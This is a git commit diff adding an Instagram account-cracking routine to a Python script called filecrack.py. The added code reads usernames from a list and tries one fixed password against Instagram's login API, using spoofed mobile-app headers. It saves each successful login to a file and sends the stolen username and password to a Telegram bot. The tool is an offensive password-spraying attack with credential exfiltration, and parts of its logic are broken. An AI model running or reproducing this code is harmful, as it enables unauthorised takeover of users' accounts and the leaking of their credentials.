cfba2314105bd88f950235957f1bc7302d033433
Aminmalake <66966944+Aminmalake@users.noreply.github.com>
2021-07-15 19:25:16 +0300

    filecrack.py
    https://www.instagram.com/i4m.amin

--- filecrack.py
+++ filecrack.py
@@ -235,4 +235,62 @@ elif ask =="1":
             b+=1    
             print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
 
+   
+        pass
+    else:
+        assk  = assk + '.txt'
+    clear()
+    banner()
+   
+    print("")
+    print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
+    acc = open(assk,"r").read().splitlines()
+    for combo in acc:
+        user = combo.split(":")[0]
+        pasw = '1122aass'
+        req = requests.session()
+        log_head = {
+        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
+        'Accept': "*/*",
+        'Cookie': 'missing',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-IG-Connection-Type': 'WIFI',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Host': 'i.instagram.com'}
+        uid = str(uuid4())
+        log_data = {
+            'uuid': uid,
+            'password': pasw,
+            'username': user,
+            'device_id': uid,
+            'from_reg': 'false',
+            '_csrftoken': 'missing',
+            'login_attempt_countn': '0'}
+        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
+        #print(r.text)
+        if "logged_in_user" in r.text:
+            if "Y" or "y" in tele:
+                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hello New Account Hited\n====================\n[=] User : {user} \n[=] Pass : {pasw}\n====================\nCh : @Berlin_Tools")
+         
+            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
+            h += 1
+            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
+        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
+            b += 1
+            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
+        elif 'challenge_required' in log.text:
+            s += 1
+            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
+        elif 'Please wait a few minutes' in log.text:
+            block += 1
+            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
+        elif 'Bad request' in log.text:
+            b += 1
+            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
+        else:
+            b+=1    
+            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
+
     
